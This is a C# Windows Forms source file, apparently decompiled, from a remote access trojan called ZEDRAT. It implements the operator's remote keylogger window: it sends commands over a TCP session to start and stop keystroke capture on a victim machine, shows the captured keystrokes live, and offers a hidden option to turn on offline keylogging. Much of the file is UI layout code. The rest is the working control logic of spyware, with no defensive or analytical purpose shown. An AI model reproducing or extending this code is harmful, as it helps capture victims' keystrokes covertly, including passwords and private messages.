using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Text;
using System.Text;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Bunifu.UI.WinForms.BunifuButton;
using Guna.UI2.WinForms;
using ns1;
using ns2;
using Sockets;
using ZEDRAT.Messages;
using ZEDRAT.TCP;

namespace ZEDRatApp.Forms
{
	public class Remote_Keylogger : Form
	{
		public TcpClientSession _tcs;

		private IContainer components;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2ControlBox guna2ControlBox1;

		private BunifuSeparator bunifuSeparator2;

		private SiticoneLabel label1;

		private SiticoneLabel label2;

		private SiticoneOSToggleSwith chkOnline;

		private SiticoneLabel siticoneLabel2;

		private Guna2ContextMenuStrip guna2ContextMenuStrip1;

		private ToolStripMenuItem activateOfflineKeyloggerToolStripMenuItem;

		private BunifuSeparator bunifuSeparator1;

		private RichTextBox textBox1;

		private SiticoneOSToggleSwith chkOffline;

		private SiticoneLabel siticoneLabel1;

		private BunifuIconButton CloseBtn;

		private Guna2ShadowForm guna2ShadowForm1;

		public Remote_Keylogger(string tital, TcpClientSession tcs)
		{
			this.InitializeComponent();
			this._tcs = tcs;
			((Control)(object)this.label1).Text = tital;
		}

		private void UpdataKeyboardForm(TcpClientSession tcs, byte[] bt)
		{
			try
			{
				Remote_Keyboard_Messages rkm = Remote_Keyboard_Messages.ByteToClass(bt);
				if (rkm.KeyboardType.Equals("GetKeyboard"))
				{
					base.Invoke((MethodInvoker)delegate
					{
						this.textBox1.Text += Encoding.UTF8.GetString(rkm.payload);
						this.textBox1.SelectionStart = this.textBox1.Text.Length;
						this.textBox1.ScrollToCaret();
					});
				}
				if (rkm.KeyboardType.Equals("Status"))
				{
					base.Invoke((MethodInvoker)delegate
					{
						((Control)(object)this.label2).Text = "Status :" + Encoding.UTF8.GetString(rkm.payload);
					});
				}
			}
			catch
			{
			}
		}

		private void chkNot_CheckedChanged(object sender, EventArgs e)
		{
			try
			{
				this._tcs?.Client_Send(DataType.RemoteKeyboardType, Remote_Keyboard_Messages.ClassToByte(new Remote_Keyboard_Messages("GetKeyboard", Encoding.UTF8.GetBytes(" "))));
			}
			catch
			{
			}
		}

		private void Remote_Keylogger_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				this._tcs?.Client_Send(DataType.RemoteKeyboardType, Remote_Keyboard_Messages.ClassToByte(new Remote_Keyboard_Messages("EndKeyboard", Encoding.UTF8.GetBytes(" "))));
				this._tcs?._Idispatchar?.Unregister(DataType.RemoteKeyboardType);
			}
			catch
			{
			}
			finally
			{
				this._tcs = null;
			}
		}

		private void Remote_Keylogger_Load(object sender, EventArgs e)
		{
			try
			{
				this._tcs?._Idispatchar?.Register(DataType.RemoteKeyboardType, new Action<TcpClientSession, byte[]>(UpdataKeyboardForm));
				this._tcs?.Client_Send(DataType.RemoteKeyboardType, Remote_Keyboard_Messages.ClassToByte(new Remote_Keyboard_Messages("BeginKeyboard", Encoding.UTF8.GetBytes(" "))));
			}
			catch
			{
			}
		}

		private void activateOfflineKeylogger(TcpClientSession tcs, byte[] bt)
		{
			Remote_Keyboard_Messages remote_Keyboard_Messages = Remote_Keyboard_Messages.ByteToClass(bt);
			Encoding.UTF8.GetString(remote_Keyboard_Messages.payload);
		}

		private void chkOffline_CheckedChanged(object sender, EventArgs e)
		{
			try
			{
				this._tcs?._Idispatchar?.Register(DataType.RemoteHydraOFFKType, new Action<TcpClientSession, byte[]>(activateOfflineKeylogger));
				this._tcs?.Client_Send(DataType.RemoteHydraOFFKType, Remote_Keyboard_Messages.ClassToByte(new Remote_Keyboard_Messages("StartOFFK", Encoding.UTF8.GetBytes(" "))));
			}
			catch
			{
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
																																							this.components = new System.ComponentModel.Container();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(ZEDRatApp.Forms.Remote_Keylogger));
			this.guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
			this.guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
			this.bunifuSeparator2 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.label1 = new SiticoneLabel();
			this.guna2ContextMenuStrip1 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
			this.activateOfflineKeyloggerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.label2 = new SiticoneLabel();
			this.chkOnline = new SiticoneOSToggleSwith();
			this.siticoneLabel2 = new SiticoneLabel();
			this.bunifuSeparator1 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.textBox1 = new System.Windows.Forms.RichTextBox();
			this.chkOffline = new SiticoneOSToggleSwith();
			this.siticoneLabel1 = new SiticoneLabel();
			this.CloseBtn = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
			this.guna2ContextMenuStrip1.SuspendLayout();
			base.SuspendLayout();
			this.guna2BorderlessForm1.ContainerControl = this;
			this.guna2ControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.guna2ControlBox1.BorderColor = System.Drawing.Color.DarkGray;
			this.guna2ControlBox1.BorderRadius = 12;
			this.guna2ControlBox1.FillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ControlBox1.HoverState.Parent = this.guna2ControlBox1;
			this.guna2ControlBox1.IconColor = System.Drawing.Color.Black;
			this.guna2ControlBox1.Location = new System.Drawing.Point(810, 12);
			this.guna2ControlBox1.Name = "guna2ControlBox1";
			this.guna2ControlBox1.ShadowDecoration.Parent = this.guna2ControlBox1;
			this.guna2ControlBox1.Size = new System.Drawing.Size(45, 29);
			this.guna2ControlBox1.TabIndex = 51;
			this.bunifuSeparator2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator2.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator2.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator2.BackgroundImage");
			this.bunifuSeparator2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator2.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator2.LineColor = System.Drawing.Color.DimGray;
			this.bunifuSeparator2.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator2.LineThickness = 1;
			this.bunifuSeparator2.Location = new System.Drawing.Point(0, 51);
			this.bunifuSeparator2.Margin = new System.Windows.Forms.Padding(6, 2, 6, 2);
			this.bunifuSeparator2.Name = "bunifuSeparator2";
			this.bunifuSeparator2.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator2.Size = new System.Drawing.Size(869, 9);
			this.bunifuSeparator2.TabIndex = 94;
			((System.Windows.Forms.Control)(object)this.label1).BackColor = System.Drawing.Color.Transparent;
			this.label1.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.label1.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.label1).Location = new System.Drawing.Point(53, 24);
			((System.Windows.Forms.Control)(object)this.label1).Name = "label1";
			((System.Windows.Forms.Control)(object)this.label1).Size = new System.Drawing.Size(84, 23);
			((System.Windows.Forms.Control)(object)this.label1).TabIndex = 93;
			((System.Windows.Forms.Control)(object)this.label1).Text = "KeyLogger";
			this.guna2ContextMenuStrip1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.guna2ContextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.activateOfflineKeyloggerToolStripMenuItem });
			this.guna2ContextMenuStrip1.Name = "guna2ContextMenuStrip1";
			this.guna2ContextMenuStrip1.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ContextMenuStrip1.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.guna2ContextMenuStrip1.RenderStyle.ColorTable = null;
			this.guna2ContextMenuStrip1.RenderStyle.RoundedEdges = true;
			this.guna2ContextMenuStrip1.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
			this.guna2ContextMenuStrip1.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
			this.guna2ContextMenuStrip1.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
			this.guna2ContextMenuStrip1.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
			this.guna2ContextMenuStrip1.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
			this.guna2ContextMenuStrip1.ShowImageMargin = false;
			this.guna2ContextMenuStrip1.Size = new System.Drawing.Size(188, 26);
			this.activateOfflineKeyloggerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.activateOfflineKeyloggerToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.activateOfflineKeyloggerToolStripMenuItem.Name = "activateOfflineKeyloggerToolStripMenuItem";
			this.activateOfflineKeyloggerToolStripMenuItem.Size = new System.Drawing.Size(187, 22);
			this.activateOfflineKeyloggerToolStripMenuItem.Text = "Activate Offline Keylogger";
			((System.Windows.Forms.Control)(object)this.label2).Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			((System.Windows.Forms.Control)(object)this.label2).BackColor = System.Drawing.Color.Transparent;
			this.label2.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.label2.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.label2).Location = new System.Drawing.Point(12, 477);
			((System.Windows.Forms.Control)(object)this.label2).Name = "label2";
			((System.Windows.Forms.Control)(object)this.label2).Size = new System.Drawing.Size(56, 23);
			((System.Windows.Forms.Control)(object)this.label2).TabIndex = 95;
			((System.Windows.Forms.Control)(object)this.label2).Text = "Status:";
			((System.Windows.Forms.Control)(object)this.chkOnline).Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.chkOnline.CheckedFillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.chkOnline.CheckedInnerColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.chkOnline).ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.chkOnline).Location = new System.Drawing.Point(810, 482);
			((System.Windows.Forms.Control)(object)this.chkOnline).Name = "chkOnline";
			((System.Windows.Forms.Control)(object)this.chkOnline).Size = new System.Drawing.Size(38, 14);
			((System.Windows.Forms.Control)(object)this.chkOnline).TabIndex = 98;
			((System.Windows.Forms.Control)(object)this.chkOnline).Text = "siticoneOSToggleSwith1";
			this.chkOnline.UncheckedFillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			this.chkOnline.UncheckInnerColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((ToggleSwitch)this.chkOnline).CheckedChanged += new System.EventHandler(chkNot_CheckedChanged);
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).BackColor = System.Drawing.Color.Transparent;
			this.siticoneLabel2.Font = new System.Drawing.Font("Century Gothic", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.siticoneLabel2.ForeColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).Location = new System.Drawing.Point(705, 479);
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).Name = "siticoneLabel2";
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).Size = new System.Drawing.Size(109, 19);
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).TabIndex = 97;
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).Text = "Get Logs Online:";
			this.bunifuSeparator1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.bunifuSeparator1.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator1.BackgroundImage");
			this.bunifuSeparator1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator1.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator1.LineColor = System.Drawing.Color.DimGray;
			this.bunifuSeparator1.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator1.LineThickness = 1;
			this.bunifuSeparator1.Location = new System.Drawing.Point(0, 468);
			this.bunifuSeparator1.Margin = new System.Windows.Forms.Padding(6, 2, 6, 2);
			this.bunifuSeparator1.Name = "bunifuSeparator1";
			this.bunifuSeparator1.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator1.Size = new System.Drawing.Size(869, 9);
			this.bunifuSeparator1.TabIndex = 100;
			this.textBox1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.textBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
			this.textBox1.ForeColor = System.Drawing.Color.White;
			this.textBox1.Location = new System.Drawing.Point(0, 64);
			this.textBox1.Margin = new System.Windows.Forms.Padding(2);
			this.textBox1.Name = "textBox1";
			this.textBox1.ReadOnly = true;
			this.textBox1.Size = new System.Drawing.Size(869, 399);
			this.textBox1.TabIndex = 101;
			this.textBox1.Text = "";
			((System.Windows.Forms.Control)(object)this.chkOffline).Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.chkOffline.CheckedFillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.chkOffline.CheckedInnerColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.chkOffline).ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.chkOffline).Location = new System.Drawing.Point(645, 482);
			((System.Windows.Forms.Control)(object)this.chkOffline).Name = "chkOffline";
			((System.Windows.Forms.Control)(object)this.chkOffline).Size = new System.Drawing.Size(38, 14);
			((System.Windows.Forms.Control)(object)this.chkOffline).TabIndex = 103;
			((System.Windows.Forms.Control)(object)this.chkOffline).Text = "siticoneOSToggleSwith1";
			this.chkOffline.UncheckedFillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			this.chkOffline.UncheckInnerColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.chkOffline).Visible = false;
			((ToggleSwitch)this.chkOffline).CheckedChanged += new System.EventHandler(chkOffline_CheckedChanged);
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).BackColor = System.Drawing.Color.Transparent;
			this.siticoneLabel1.Font = new System.Drawing.Font("Century Gothic", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.siticoneLabel1.ForeColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).Location = new System.Drawing.Point(540, 479);
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).Name = "siticoneLabel1";
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).Size = new System.Drawing.Size(109, 19);
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).TabIndex = 102;
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).Text = "Get Logs Offline:";
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).Visible = false;
			this.CloseBtn.AllowAnimations = true;
			this.CloseBtn.AllowBorderColorChanges = true;
			this.CloseBtn.AllowMouseEffects = true;
			this.CloseBtn.AnimationSpeed = 200;
			this.CloseBtn.BackColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BackgroundColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.CloseBtn.BorderRadius = 1;
			this.CloseBtn.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.CloseBtn.BorderThickness = 1;
			this.CloseBtn.ColorContrastOnClick = 30;
			this.CloseBtn.ColorContrastOnHover = 30;
			this.CloseBtn.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges.BottomLeft = true;
			borderEdges.BottomRight = true;
			borderEdges.TopLeft = true;
			borderEdges.TopRight = true;
			this.CloseBtn.CustomizableEdges = borderEdges;
			this.CloseBtn.DialogResult = System.Windows.Forms.DialogResult.None;
			this.CloseBtn.Image = (System.Drawing.Image)resources.GetObject("CloseBtn.Image");
			this.CloseBtn.ImageMargin = new System.Windows.Forms.Padding(0);
			this.CloseBtn.Location = new System.Drawing.Point(12, 12);
			this.CloseBtn.Name = "CloseBtn";
			this.CloseBtn.RoundBorders = false;
			this.CloseBtn.ShowBorders = true;
			this.CloseBtn.Size = new System.Drawing.Size(35, 35);
			this.CloseBtn.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.CloseBtn.TabIndex = 169;
			this.guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ShadowForm1.TargetForm = this;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(867, 511);
			base.Controls.Add(this.CloseBtn);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.chkOffline);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneLabel1);
			base.Controls.Add(this.textBox1);
			base.Controls.Add(this.bunifuSeparator1);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.chkOnline);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneLabel2);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.label2);
			base.Controls.Add(this.bunifuSeparator2);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.label1);
			base.Controls.Add(this.guna2ControlBox1);
			this.ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "Remote_Keylogger";
			this.Text = "Remote_Keylogger";
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(Remote_Keylogger_FormClosed);
			base.Load += new System.EventHandler(Remote_Keylogger_Load);
			this.guna2ContextMenuStrip1.ResumeLayout(false);
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
